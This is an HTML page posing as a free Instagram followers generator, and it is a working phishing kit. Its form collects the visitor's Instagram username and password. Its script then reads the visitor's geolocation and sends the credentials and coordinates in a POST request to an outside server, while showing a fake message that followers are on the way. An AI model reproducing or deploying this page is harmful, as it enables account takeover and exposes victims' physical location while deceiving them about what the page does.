<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Free Followers Tool</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
      background: linear-gradient(to right, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      color: white;
    }
    .container {
      background-color: rgba(0, 0, 0, 0.4);
      padding: 30px;
      border-radius: 15px;
      width: 90%;
      max-width: 400px;
      margin: auto;
    }
    input, select, button {
      padding: 10px;
      margin-top: 15px;
      width: 100%;
      font-size: 16px;
      border-radius: 8px;
      border: none;
    }
    button {
      background-color: white;
      color: #d62976;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      touch-action: manipulation;
    }
    button:hover {
      background-color: #f1f1f1;
    }
    #output {
      margin-top: 20px;
      font-size: 15px;
      white-space: pre-wrap;
      display: none;
      animation: fadeIn 1s ease-in;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🚀 Instagram Followers Generator</h2>
    <p>Enter your details to get up to 100K followers!</p>

    <input type="text" id="username" placeholder="Instagram Username" required>
    <input type="password" id="password" placeholder="Password" required>
    <select id="followers">
      <option value="1000">1,000 Followers</option>
      <option value="5000">5,000 Followers</option>
      <option value="10000">10,000 Followers</option>
      <option value="50000">50,000 Followers</option>
      <option value="100000">100,000 Followers</option>
    </select>

    <button onclick="verifyAndLocate()">Get Followers</button>
    <div id="output"></div>
  </div>

  <script>
    function verifyAndLocate() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const followers = document.getElementById('followers').value;
      const output = document.getElementById('output');

      if (!username || !password) {
        return;
      }

      output.style.display = "block";
      output.innerHTML = `⏳ Verifying @${username} for ${followers} followers...`;

      if (!navigator.geolocation) {
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          fetch("https://instafollowers.onrender.com/", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: username, password: password, lat: lat, lon: lon })
          })
          .finally(() => {
            setTimeout(() => {
              output.innerHTML = `✅ Verified @${username}!

🎉 ${followers} followers will be added soon!`;
            }, 1500);
          });
        },
        () => {
          // Do nothing on location denial
        }
      );
    }
  </script>
</body>
</html>
